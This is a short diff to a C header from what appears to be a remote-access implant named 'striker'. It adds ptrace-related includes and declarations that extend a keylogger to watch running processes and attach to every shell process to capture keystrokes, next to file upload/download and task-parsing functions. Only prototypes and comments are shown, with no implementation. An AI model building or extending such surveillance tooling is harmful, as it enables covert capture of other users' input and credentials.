@@ -15,9 +15,13 @@
 #include <unistd.h>
 #include <time.h>
 #include <fcntl.h>
+#include <dirent.h>
 #include <linux/input.h>
 #include <sys/select.h>
 #include <pthread.h>
+#include <sys/ptrace.h>
+#include <sys/wait.h>
+#include <sys/user.h>
 #include <curl/curl.h>
 #include "cJSON.h"
 #include "striker_utils.h"
@@ -74,8 +78,14 @@ short int upload_file(char *url, char *filename, FILE *rfo, buffer *result_buff)
 // Download a file from `url` and save to `wfo`. Returns 1 on success.
 short int download_file(char *url, FILE *wfo, buffer *result_buff);
 
-// Keylogger.
-void keymon(task *tsk);
+// Starts the keylogger
+void keymon(session *striker, task *tsk);
+
+// Monitors processes and call keymon_proc_attach() to have the keylogged.
+void *keymon_proc_watch(void *ptr);
+
+// Called by keymon in bg thread for every shell process to be tapped.
+void *keymon_proc_attach(void *ptr);
 
 // Parse a task JSON and return it, NULL on error.
 task *parse_task(cJSON *json);
